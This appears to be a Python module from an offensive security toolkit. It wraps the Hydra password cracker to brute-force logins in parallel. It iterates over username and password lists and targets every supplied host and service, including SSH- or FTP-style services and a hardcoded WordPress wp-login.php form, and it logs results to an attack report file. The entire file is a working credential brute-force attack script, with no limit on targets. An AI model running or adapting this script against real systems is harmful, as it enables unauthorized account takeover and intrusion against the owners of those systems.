import os
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from Exploiting.Helper.validip import is_valid_cidr, is_valid_ipv4

def hydra_crack(username_file, password_file, services, hosts):
    
    usernames = []
    passwords = []

    # Create the output directory if it doesn't exist
    output_directory = 'attack_reports'
    if not os.path.exists(output_directory):
        os.makedirs(output_directory)

    # Output file path
    output_file = os.path.join(output_directory, 'hydra.txt')

    # Open the output file in write mode to clear previous content
    with open(output_file, 'w') as f:
        f.write("")

    # Read usernames from file or use the provided string if file not found
    if os.path.isfile(username_file):
        with open(username_file, 'r') as ufile:
            usernames = ufile.read().splitlines()
    else:
        usernames = username_file.splitlines()

    # Read passwords from file or use the provided string if file not found
    if os.path.isfile(password_file):
        with open(password_file, 'r', encoding='latin-1') as pfile:
            passwords = pfile.read().splitlines()
    else:
        passwords = password_file.splitlines()

    def run_hydra(username, password, service, host):
        if service.startswith("http"):
            # Assuming a general http-post-form for demonstration, adjust as needed
            command = [
                'hydra',
                '-l', username,
                '-p', password,
                '-t', '4',
                f'{host}',
                'http-post-form',
                '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username'
            ]
        else:
            # General format for other services like ssh, ftp, etc.
            command = [
                'hydra',
                '-l', username,
                '-p', password,
                '-t', '4',
                f'{service}://{host}'
            ]
        try:
            print("Starting hydra attack")
            result = subprocess.run(command, text=True, capture_output=True, check=True)
            output = f"Trying {username}:{password} on {service}://{host}\n{result.stdout}\n"
            print(output)
            with open(output_file, 'a') as f:
                f.write(output)
            print("Finished hydra attack")
            return result.stdout
        except subprocess.CalledProcessError as e:
            error_output = f"Hydra encountered an error: {e}\nCommand: {' '.join(command)}\n{e.stderr}\n"
            print(error_output)
            with open(output_file, 'a') as f:
                f.write(error_output)
            return e.output

    # Use ThreadPoolExecutor to parallelize the execution
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for service in services:
            for host in hosts:
                for username in usernames:
                    for password in passwords:
                        futures.append(executor.submit(run_hydra, username, password, service, host))

        for future in as_completed(futures):
            future.result()

